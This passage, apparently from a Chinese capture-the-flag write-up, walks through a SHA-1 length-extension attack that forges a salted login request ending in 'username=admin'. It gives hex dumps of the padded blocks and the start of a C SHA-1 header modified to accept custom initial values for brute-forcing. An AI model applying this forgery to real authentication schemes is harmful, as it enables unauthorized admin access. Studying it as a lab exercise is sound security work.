</code></pre><p>&#x7136;&#x540E;&#x4F7F;&#x7528;&#x4E0B;&#x9762;&#x7684;&#x4E00;&#x7EC4;&#x6570;&#x4F5C;&#x4E3A;&#x521D;&#x59CB;&#x5316;&#x5411;&#x91CF;&#x8FDB;&#x884C;&#x8BA1;&#x7B97;&#xFF0C;</p>
<pre><code><span class="setting">h0=<span class="value"><span class="number">0</span>x67452301,</span></span>
<span class="setting">h1=<span class="value"><span class="number">0</span>xEFCDAB89,</span></span>
<span class="setting">h2=<span class="value"><span class="number">0</span>x98BADCFE,</span></span>
<span class="setting">h3=<span class="value"><span class="number">0</span>x10325476,</span></span>
<span class="setting">h4=<span class="value"><span class="number">0</span>xC3D2E1F0</span></span>
</code></pre><p>&#x8BA1;&#x7B97;&#x7684;&#x89C4;&#x5219;&#x662F;&#x5BF9;&#x8865;&#x9F50;&#x540E;&#x7684;&#x6570;&#x636E;&#x4EE5;512bit&#x5373;64&#x5B57;&#x8282;&#x4E3A;&#x4E00;&#x7EC4;&#x8FDB;&#x884C;&#x79FB;&#x4F4D;&#x5F02;&#x6216;&#x7B49;&#x6570;&#x5B66;&#x8BA1;&#x7B97;&#xFF0C;&#x6BCF;&#x4E00;&#x7EC4;&#x8BA1;&#x7B97;&#x4F1A;&#x6539;&#x53D8;h1-h4&#x7684;&#x503C;&#xFF0C;&#x8FD9;&#x4E9B;&#x6539;&#x53D8;&#x7684;&#x503C;&#x5C06;&#x4F5C;&#x4E3A;&#x4E0B;&#x4E00;&#x7EC4;&#x8BA1;&#x7B97;&#x7684;&#x521D;&#x59CB;&#x5316;&#x5411;&#x91CF;&#x3002;&#x5168;&#x90E8;&#x7EC4;&#x8BA1;&#x7B97;&#x5B8C;&#x6210;&#x540E;&#x6700;&#x7EC8;&#x7684;&#x521D;&#x59CB;&#x5316;&#x5411;&#x91CF;&#x62FC;&#x63A5;&#x8D77;&#x6765;&#x5C31;&#x662F;sha1&#x7684;&#x503C;&#x3002;</p>
<p>&#x8FD9;&#x6837;&#x5C31;&#x5F62;&#x6210;&#x4E86;&#x6211;&#x4EEC;&#x7684;&#x653B;&#x51FB;&#x601D;&#x8DEF;&#xFF0C;&#x9996;&#x5148;&#x53D1;&#x9001;&#x6B63;&#x5E38;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x83B7;&#x53D6;sha1&#xFF0C;&#x7136;&#x540E;&#x6211;&#x4EEC;&#x624B;&#x52A8;&#x8865;&#x9F50;&#x4E0A;&#x4E00;&#x7EC4;&#x6B63;&#x5E38;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x53C8;&#x83B7;&#x53D6;&#x4E00;&#x4E2A;sha1&#xFF0C;&#x4E4B;&#x540E;&#x5BF9;&#x7B2C;&#x4E00;&#x7EC4;&#x83B7;&#x53D6;&#x7684;sha1&#x7684;&#x521D;&#x59CB;&#x5316;&#x5411;&#x91CF;&#x8FDB;&#x884C;&#x63D0;&#x53D6;&#xFF0C;&#x4FEE;&#x6539;&#x7B97;&#x6CD5;&#x4E2D;&#x7684;&#x521D;&#x59CB;&#x5316;&#x5411;&#x91CF;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x8FD9;&#x4E2A;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x7B97;&#x6CD5;&#x4EC5;&#x4EC5;&#x7528;&#x4E8E;&#x5BF9;&#x7B2C;&#x4E8C;&#x7EC4;&#x6570;&#x636E;&#x7684;&#x8865;&#x5168;&#x6570;&#x636E;&#x8FDB;&#x884C;sha1&#xFF0C;&#x5C31;&#x80FD;&#x5F97;&#x51FA;&#x4E0E;&#x7B2C;&#x4E8C;&#x7EC4;&#x83B7;&#x53D6;&#x7684;sha1&#x76F8;&#x540C;&#x7684;&#x6570;&#x636E;&#x3002;</p>
<p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x6211;&#x4EEC;&#x53D1;&#x9001;&#x7684;&#x7B2C;&#x4E00;&#x7EC4;&#x6570;&#x636E;&#x4E3A;</p>
<pre><code><span class="number">00000000</span>: <span class="number">73</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">C</span> <span class="number">74</span> <span class="number">73</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">C</span>   <span class="number">74</span>  <span class="number">73</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">C</span> <span class="number">74</span> <span class="number">73</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">C</span> <span class="number">74</span>  saltsaltsaltsalt
<span class="number">00000010</span>: <span class="number">2</span>F <span class="number">6</span><span class="keyword">C</span> <span class="number">6</span>F <span class="number">67</span> <span class="number">69</span> <span class="number">6</span><span class="keyword">E</span> <span class="number">3</span>F   <span class="number">75</span>  <span class="number">73</span> <span class="number">65</span> <span class="number">72</span> <span class="number">6</span><span class="keyword">E</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">D</span> <span class="number">65</span> <span class="number">3</span><span class="keyword">D</span>  /login?username=
<span class="number">00000020</span>: <span class="number">61</span> <span class="number">26</span> <span class="number">70</span> <span class="number">61</span> <span class="number">73</span> <span class="number">73</span> <span class="number">77</span>   <span class="number">6</span>F  <span class="number">72</span> <span class="number">64</span> <span class="number">3</span><span class="keyword">D</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  a&amp;amp;password=aaaaa
<span class="number">00000030</span>: <span class="number">61</span> <span class="number">26</span> <span class="number">75</span> <span class="number">73</span> <span class="number">65</span> <span class="number">72</span> <span class="number">6</span><span class="keyword">E</span>   <span class="number">61</span>  <span class="number">6</span><span class="keyword">D</span> <span class="number">65</span> <span class="number">3</span><span class="keyword">D</span> <span class="number">61</span> <span class="number">64</span> <span class="number">6</span><span class="keyword">D</span> <span class="number">69</span> <span class="number">6</span><span class="keyword">E</span>  a&amp;amp;username=admin
</code></pre><p>&#x8FD9;&#x7EC4;&#x6570;&#x636E;&#x83B7;&#x53D6;&#x7684;sha1&#x4E3A;a02d54c05cecc94ff2d698146e0b2c778104d85&#xFF0C;&#x83B7;&#x53D6;&#x7684;&#x521D;&#x59CB;&#x5316;&#x5411;&#x91CF;&#x5206;&#x522B;&#x4E3A;0xa02d54c0&#xFF0C;0x5cecc94f&#xFF0C;0xf2d69814&#xFF0C;0x6e0b2c77&#xFF0C;0x8104d85</p>
<p>&#x53D1;&#x9001;&#x7684;&#x7B2C;&#x4E8C;&#x7EC4;&#x6570;&#x636E;&#x4E3A;</p>
<pre><code><span class="number">00000000</span>: 73 61 6C <span class="number">74 73 61 6</span>C   74  73 61 6C <span class="number">74 73 61 6</span>C 74  saltsaltsaltsalt
<span class="number">00000010</span>: 2F 6C 6F 67 69 6E 3F   75  <span class="number">73 65 72 6</span>E 61 6D 65 3D  /login?username=
<span class="number">00000020</span>: <span class="number">61 26 70 61</span> 73 73 77   6F  72 64 3D <span class="number">61 61 61 61</span> 61  a&amp;amp<span class="comment">;password=aaaaa</span>
<span class="number">00000030</span>: <span class="number">61 26 75 73</span> 65 72 6E   61  6D 65 3D 61 64 6D 69 6E  a&amp;amp<span class="comment">;username=admin</span>
<span class="number">00000040</span>: <span class="number">80 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000050</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000060</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000070</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 02 00</span>  ................
</code></pre><p>&#x8BE5;&#x7EC4;&#x5728;&#x8BA1;&#x7B97;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x8865;&#x5168;&#x7684;&#x7ED3;&#x679C;&#x4E3A;</p>
<pre><code><span class="number">00000000</span>: 73 61 6C <span class="number">74 73 61 6</span>C   74  73 61 6C <span class="number">74 73 61 6</span>C 74  saltsaltsaltsalt
<span class="number">00000010</span>: 2F 6C 6F 67 69 6E 3F   75  <span class="number">73 65 72 6</span>E 61 6D 65 3D  /login?username=
<span class="number">00000020</span>: <span class="number">61 26 70 61</span> 73 73 77   6F  72 64 3D <span class="number">61 61 61 61</span> 61  a&amp;amp<span class="comment">;password=aaaaa</span>
<span class="number">00000030</span>: <span class="number">61 26 75 73</span> 65 72 6E   61  6D 65 3D 61 64 6D 69 6E  a&amp;amp<span class="comment">;username=admin</span>
<span class="number">00000040</span>: <span class="number">80 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000050</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000060</span>: <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000070</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 02 00</span>  ................
<span class="number">00000080</span>: <span class="number">80 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000090</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">000000A0</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">000000B0</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 04 00</span>  ................
</code></pre><p>&#x83B7;&#x53D6;&#x7684;sha1&#x4E3A;f687bedf0ce1e96f9238c7dae716337b0d9d74ad</p>
<p>&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x5C06;&#x521D;&#x59CB;&#x5316;&#x53D8;&#x91CF;0xa02d54c0,0x5cecc94f0x,f2d69814,0x6e0b2c77,0x8104d85&#x5E26;&#x5165;&#x7B97;&#x6CD5;&#xFF0C;&#x53EA;&#x9700;&#x8BA1;&#x7B97;&#x8865;&#x4E0A;&#x7684;&#x4FE1;&#x606F;</p>
<pre><code><span class="number">00000080</span>: <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="built_in">.
</span><span class="number">00000090</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="built_in">.
</span><span class="number">000000</span>A0: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="built_in">.
</span><span class="number">000000</span>B0: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">04</span> <span class="number">00</span>  <span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="built_in">.</span>
</code></pre><p>&#x5C31;&#x53EF;&#x4EE5;&#x5F97;&#x51FA;&#x4E0E;&#x7B2C;&#x4E8C;&#x7EC4;&#x76F8;&#x7B49;&#x7684;sha1&#xFF0C;&#x5373;f687bedf0ce1e96f9238c7dae716337b0d9d74ad</p>
<p>&#x672C;&#x9898;&#x4E2D;&#xFF0C;&#x7531;&#x4E8E;&#x83B7;&#x53D6;&#x7684;sha1&#x4E0D;&#x5168;&#xFF0C;&#x53EA;&#x9700;&#x5BF9;&#x7B2C;&#x4E00;&#x6B21;&#x83B7;&#x53D6;&#x7684;sha1&#x4E2D;&#x7684;x&#x8FDB;&#x884C;&#x7206;&#x7834;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x7B2C;&#x4E00;&#x6B21;&#x7684;sha1&#xFF0C;&#x63D0;&#x4EA4;&#x5373;&#x53EF;&#x3002;</p>
<h4 id="&#x5148;&#x7528;python&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x7206;&#x7834;&#xFF0C;&#x7ED3;&#x679C;&#x592A;&#x6162;&#x4E86;&#xFF0C;&#x6709;&#x7528;c&#x5199;&#x4E86;&#x4E00;&#x4E2A;">&#x5148;&#x7528;python&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x7206;&#x7834;&#xFF0C;&#x7ED3;&#x679C;&#x592A;&#x6162;&#x4E86;&#xFF0C;&#x6709;&#x7528;c&#x5199;&#x4E86;&#x4E00;&#x4E2A;</h4><pre><code>&amp;<span class="symbol">#x4EE3</span>;&amp;<span class="symbol">#x7801</span>;
<span class="class">Sha1</span>.h
//! <span class="class">SHA1</span> &amp;<span class="symbol">#x52A8</span>;&amp;<span class="symbol">#x6001</span>;&amp;<span class="symbol">#x94FE</span>;&amp;<span class="symbol">#x63A5</span>;&amp;<span class="symbol">#x5E93</span>;&amp;<span class="symbol">#x5B9E</span>;&amp;<span class="symbol">#x73B0</span>;   <span class="class">H</span>&amp;<span class="symbol">#x6587</span>;&amp;<span class="symbol">#x4EF6</span>;
<span class="symbol">#ifndef</span> <span class="class">SHA1_H</span>
<span class="symbol">#define</span> <span class="class">SHA1_H</span>

<span class="symbol">#include</span> &amp;quot;stdio.h&amp;quot;
//! #&amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;<span class="class">SHA</span> &amp;<span class="symbol">#x4E2D</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;<span class="class">ENUM</span>
/*&amp;<span class="symbol">#xFF01</span>;
     @see enum
*/
<span class="symbol">#ifndef</span> _SHA_enum_
<span class="symbol">#define</span> _SHA_enum_
enum
{
         shaSuccess   = <span class="number">0</span>,
         /*!   &amp;lt;&amp;<span class="symbol">#x7A7A</span>;&amp;<span class="symbol">#x6307</span>;&amp;<span class="symbol">#x793A</span>;&amp;<span class="symbol">#x53C2</span>;&amp;<span class="symbol">#x91CF</span>; */
         shaNull,           
         /*!   &amp;lt; &amp;<span class="symbol">#x8F93</span>;&amp;<span class="symbol">#x5165</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x592A</span>;&amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x63D0</span>;&amp;<span class="symbol">#x793A</span>; */
         shaInputTooLong,
          /*! &amp;lt;called <span class="class">Input</span> after <span class="class">Result</span> --&amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x8F93</span>;&amp;<span class="symbol">#x5165</span>;&amp;<span class="symbol">#x7ED3</span>;&amp;<span class="symbol">#x679C</span>;&amp;<span class="symbol">#x547D</span>;&amp;<span class="symbol">#x540D</span>;&amp;<span class="symbol">#x4E4B</span>; */
         shaStateError     
};
<span class="symbol">#endif</span>
//! <span class="class">SHA1HashSize</span>&amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x662F</span>;<span class="class">SHA1</span>&amp;<span class="symbol">#x54C8</span>;&amp;<span class="symbol">#x5E0C</span>;&amp;<span class="symbol">#x8868</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x5927</span>;&amp;<span class="symbol">#x5C0F</span>;
<span class="symbol">#define</span> <span class="class">SHA1HashSize</span> <span class="number">20</span>
//!   #&amp;<span class="symbol">#x80FD</span>;&amp;<span class="symbol">#x591F</span>;&amp;<span class="symbol">#x8FDB</span>;&amp;<span class="symbol">#x884C</span>;&amp;<span class="symbol">#x52A8</span>;&amp;<span class="symbol">#x6001</span>;&amp;<span class="symbol">#x94FE</span>;&amp;<span class="symbol">#x63A5</span>;&amp;<span class="symbol">#x5E93</span>;&amp;<span class="symbol">#x7F16</span>;&amp;<span class="symbol">#x8BD1</span>;&amp;<span class="symbol">#x7684</span>;<span class="class">SHA1</span>&amp;<span class="symbol">#x7C7B</span>;
 /*! 
       @see class _declspec(dllexport) <span class="class">SHA_1</span>
       &amp;<span class="symbol">#x5C06</span>;<span class="class">SHA1</span>&amp;<span class="symbol">#x7B97</span>;&amp;<span class="symbol">#x6CD5</span>;&amp;<span class="symbol">#x5199</span>;&amp;<span class="symbol">#x6210</span>;&amp;<span class="symbol">#x52A8</span>;&amp;<span class="symbol">#x6001</span>;&amp;<span class="symbol">#x94FE</span>;&amp;<span class="symbol">#x63A5</span>;&amp;<span class="symbol">#x5E93</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x5F62</span>;&amp;<span class="symbol">#x5F0F</span>;&amp;<span class="symbol">#x65B9</span>;&amp;<span class="symbol">#x4FBF</span>;&amp;<span class="symbol">#x8C03</span>;&amp;<span class="symbol">#x7528</span>;&amp;<span class="symbol">#xFF0C</span>;&amp;<span class="symbol">#x751F</span>;&amp;<span class="symbol">#x6210</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x4F7F</span>;&amp;<span class="symbol">#x7528</span>;
 */
class _declspec(dllexport) <span class="class">SHA_1</span>
{
<span class="method">public:</span>
         //!   #&amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x7ED3</span>;&amp;<span class="symbol">#x6784</span>;&amp;<span class="symbol">#x63A7</span>;&amp;<span class="symbol">#x5236</span>;&amp;<span class="symbol">#x4E0A</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x6587</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>; <span class="class">SHA1Context</span>
         /*!
             &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x8FD9</span>;&amp;<span class="symbol">#x79CD</span>;&amp;<span class="symbol">#x7ED3</span>;&amp;<span class="symbol">#x6784</span>;&amp;<span class="symbol">#x5C06</span>;&amp;<span class="symbol">#x4F1A</span>;&amp;<span class="symbol">#x63A7</span>;&amp;<span class="symbol">#x5236</span>;&amp;<span class="symbol">#x4E0A</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x6587</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>; for   the <span class="class">SHA</span>-<span class="number">1</span>
             hashing operation
                   @see   struct <span class="class">SHA1Context</span>
         */
         typedef   struct <span class="class">SHA1Context</span>
         {
                   unsigned   long <span class="class">Intermediate_Hash</span>[<span class="class">SHA1HashSize</span>/<span class="number">4</span>]; /*! &amp;lt;<span class="class">Message</span> <span class="class">Digest</span>  */

                   unsigned   long <span class="class">Length_Low</span>;            /*!   &amp;lt;<span class="class">Message</span> length in bits      */
                   unsigned   long <span class="class">Length_High</span>;           /*!   &amp;lt;<span class="class">Message</span> length in bits      */

                   /*!   &amp;lt;<span class="class">Index</span> into message block array   */
                   long   <span class="class">Message_Block_Index</span>;
                   unsigned   char <span class="class">Message_Block</span>[<span class="number">64</span>];      /*!   &amp;lt;<span class="number">512</span>-bit message blocks      */

                   int   <span class="class">Computed</span>;               /*! &amp;lt;<span class="class">Is</span> the   digest computed?         */
                   int   <span class="class">Corrupted</span>;             /*! &amp;lt;<span class="class">Is</span> the   message digest corrupted? */
         }   <span class="class">SHA1Context</span>;

<span class="method">public:</span>
      //! <span class="symbol">#SHA_1</span> &amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6784</span>;&amp;<span class="symbol">#x9020</span>;&amp;<span class="symbol">#x51FD</span>;&amp;<span class="symbol">#x6570</span>;
      /*!
          @see <span class="class">SHA_1</span>()
      &amp;<span class="symbol">#x5176</span>;&amp;<span class="symbol">#x4E2D</span>;&amp;<span class="symbol">#x5E94</span>;&amp;<span class="symbol">#x8BE5</span>;&amp;<span class="symbol">#x5BF9</span>;<span class="class">SHA_1</span>&amp;<span class="symbol">#x7C7B</span>;&amp;<span class="symbol">#x4E2D</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x4E00</span>;&amp;<span class="symbol">#x4E9B</span>;&amp;<span class="symbol">#x53D8</span>;&amp;<span class="symbol">#x91CF</span>;&amp;<span class="symbol">#x8FDB</span>;&amp;<span class="symbol">#x884C</span>;&amp;<span class="symbol">#x76F8</span>;&amp;<span class="symbol">#x5E94</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x521D</span>;&amp;<span class="symbol">#x59CB</span>;&amp;<span class="symbol">#x5316</span>;
      */
         <span class="class">SHA_1</span>();
         //!   <span class="symbol">#SHA_1</span>&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6790</span>;&amp;<span class="symbol">#x6784</span>;&amp;<span class="symbol">#x51FD</span>;&amp;<span class="symbol">#x6570</span>;
      /*!
         @see   ~<span class="class">SHA_1</span>()
      &amp;<span class="symbol">#x91CA</span>;&amp;<span class="symbol">#x653E</span>;&amp;<span class="symbol">#x5185</span>;&amp;<span class="symbol">#x5B58</span>;
      */
         ~<span class="class">SHA_1</span>(void);

         /*----------------------------------&amp;<span class="symbol">#xFFFD</span>;&amp;<span class="symbol">#xFFFD</span>;&amp;<span class="symbol">#xFFFD</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x539F</span>;&amp;<span class="symbol">#x578B</span>;----------------------------------*/
         //!   <span class="symbol">#SHA1</span>&amp;<span class="symbol">#x7B97</span>;&amp;<span class="symbol">#x6CD5</span>;&amp;<span class="symbol">#x4E2D</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x586B</span>;&amp;<span class="symbol">#x5145</span>;&amp;<span class="symbol">#x6A21</span>;&amp;<span class="symbol">#x5757</span>;
      /*!
           @see void <span class="class">SHA1PadMessage</span>(<span class="class">SHA1Context</span> *);
           @param[<span class="class">SHA1Context</span>*  &amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x586B</span>;&amp;<span class="symbol">#x5145</span>;&amp;<span class="symbol">#x4FE1</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6307</span>;&amp;<span class="symbol">#x9488</span>;
           @return[void] &amp;<span class="symbol">#x4E0D</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;&amp;<span class="symbol">#x4EFB</span>;&amp;<span class="symbol">#x4F55</span>;&amp;<span class="symbol">#x503C</span>;
      */
         void   <span class="class">SHA1PadMessage</span>(<span class="class">SHA1Context</span> *);      /*  &amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x586B</span>;&amp;<span class="symbol">#x5145</span>;&amp;<span class="symbol">#x4FE1</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6307</span>;&amp;<span class="symbol">#x9488</span>;  */
      //! <span class="symbol">#SHA1</span>&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x5757</span>;&amp;<span class="symbol">#x63CF</span>;&amp;<span class="symbol">#x8FF0</span>;&amp;<span class="symbol">#x51FD</span>;&amp;<span class="symbol">#x6570</span>;
      /*!
           @see void <span class="class">SHA1ProcessMessageBlock</span>(<span class="class">SHA1Context</span>   *);
           @param[<span class="class">SHA1Context</span>*  &amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x586B</span>;&amp;<span class="symbol">#x5145</span>;&amp;<span class="symbol">#x4FE1</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6307</span>;&amp;<span class="symbol">#x9488</span>;
           @param[in] &amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x5757</span>;&amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x5EA6</span>;&amp;<span class="symbol">#x4E3A</span>;&amp;<span class="symbol">#x56FA</span>;&amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E4B</span>;<span class="number">512</span>&amp;<span class="symbol">#x6BD4</span>;&amp;<span class="symbol">#x7279</span>;
           @return[void] &amp;<span class="symbol">#x4E0D</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;&amp;<span class="symbol">#x4EFB</span>;&amp;<span class="symbol">#x4F55</span>;&amp;<span class="symbol">#x503C</span>;
      */
         void   <span class="class">SHA1ProcessMessageBlock</span>(<span class="class">SHA1Context</span> *);
         //!   <span class="symbol">#SHA1</span>&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x521D</span>;&amp;<span class="symbol">#x59CB</span>;&amp;<span class="symbol">#x5316</span>;&amp;<span class="symbol">#x64CD</span>;&amp;<span class="symbol">#x4F5C</span>;&amp;<span class="symbol">#x51FD</span>;&amp;<span class="symbol">#x6570</span>;
      /*!
           @see int <span class="class">SHA1Reset</span>(  <span class="class">SHA1Context</span> *);
           @param[<span class="class">SHA1Context</span>*  &amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x586B</span>;&amp;<span class="symbol">#x5145</span>;&amp;<span class="symbol">#x4FE1</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6307</span>;&amp;<span class="symbol">#x9488</span>;
           @return[int] &amp;<span class="symbol">#x6210</span>;&amp;<span class="symbol">#x529F</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;shaNull&amp;<span class="symbol">#xFF0C</span>;&amp;<span class="symbol">#x5931</span>;&amp;<span class="symbol">#x8D25</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;shaSuccess
           @see <span class="class">SHA1</span> enum
      */
         int   <span class="class">SHA1Reset</span>(  <span class="class">SHA1Context</span> *,unsigned long   , unsigned long , unsigned long,unsigned long,unsigned long);
         //!   <span class="symbol">#SHA1</span>&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x8F93</span>;&amp;<span class="symbol">#x5165</span>;&amp;<span class="symbol">#x63CF</span>;&amp;<span class="symbol">#x8FF0</span>;&amp;<span class="symbol">#x51FD</span>;&amp;<span class="symbol">#x6570</span>;
      /*!
           @see int <span class="class">SHA1Input</span>(  <span class="class">SHA1Context</span> *, const unsigned char *,   unsigned int);
           @param[<span class="class">SHA1Context</span>*  &amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x586B</span>;&amp;<span class="symbol">#x5145</span>;&amp;<span class="symbol">#x4FE1</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6307</span>;&amp;<span class="symbol">#x9488</span>;
      @param[unsigned char &amp;<span class="symbol">#x63A5</span>;&amp;<span class="symbol">#x6536</span>;&amp;<span class="symbol">#x5355</span>;&amp;<span class="symbol">#x4F4D</span>;&amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x5EA6</span>;&amp;<span class="symbol">#x4E3A</span>;<span class="number">8</span>&amp;<span class="symbol">#x5B57</span>;&amp;<span class="symbol">#x8282</span>;&amp;<span class="symbol">#x500D</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;
           @return[enum] &amp;<span class="symbol">#x6210</span>;&amp;<span class="symbol">#x529F</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;shaNull&amp;<span class="symbol">#xFF0C</span>;&amp;<span class="symbol">#x5931</span>;&amp;<span class="symbol">#x8D25</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;shaSuccess&amp;<span class="symbol">#xFF0C</span>;&amp;<span class="symbol">#x9519</span>;&amp;<span class="symbol">#x8BEF</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;shaStateError
           @see <span class="class">SHA1</span> enum
      */
